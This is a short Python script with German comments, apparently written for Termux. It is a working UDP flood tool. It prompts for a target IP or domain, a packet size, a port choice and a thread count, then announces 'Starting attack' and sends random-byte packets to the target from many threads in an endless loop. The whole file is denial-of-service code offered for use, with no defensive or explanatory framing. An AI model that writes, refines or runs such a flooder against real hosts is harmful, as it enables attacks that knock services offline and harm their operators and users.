import random
import socket
from concurrent.futures import ThreadPoolExecutor

# Terminal leeren (Termux-kompatibel)
print("\033c")  # Dies funktioniert in Termux, um das Terminal zu leeren

# Socket-Setup
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Ziel-IP ermitteln
while True:
    target = input("Enter target (IP or domain): ").strip()
    try:
        ip = socket.gethostbyname(target)
        break
    except socket.gaierror:
        print("Invalid input! Please enter a valid IP or domain.")

# Paketgröße wählen
while True:
    try:
        byte_size = int(input("Enter packet size in bytes: "))
        if byte_size > 0:
            break
    except ValueError:
        pass

# Datenpaket generieren
packet = random._urandom(byte_size)

# Port-Einstellungen
random_port = input("Use random ports? (y/n): ").strip().lower()
if random_port == "y":
    use_random_port = True
else:
    use_random_port = False
    while True:
        try:
            port = int(input("Enter target port: "))
            if 1 <= port <= 65535:
                break
        except ValueError:
            pass

# Anzahl der Threads wählen
while True:
    try:
        thread_count = int(input("Enter number of threads (recommended: 100-500): "))
        if thread_count > 0:
            break
    except ValueError:
        pass

# Funktion zum Senden von Paketen
def send_packets(_):
    while True:
        if use_random_port:
            port = random.randint(1, 65535)
        sock.sendto(packet, (ip, port))

# Attacke starten
print("\nStarting attack...\n")

# ThreadPoolExecutor für die Threads verwenden
with ThreadPoolExecutor(max_workers=thread_count) as executor:
    # Die Threads einzeln starten, um genau die gewünschte Anzahl an Threads zu bekommen
    futures = [executor.submit(send_packets, i) for i in range(thread_count)]

    # Warten, bis alle Threads abgeschlossen sind (optional, wenn du das Resultat brauchst)
    for future in futures:
        future.result()  # Dies wartet darauf, dass der Thread seine Arbeit beendet.
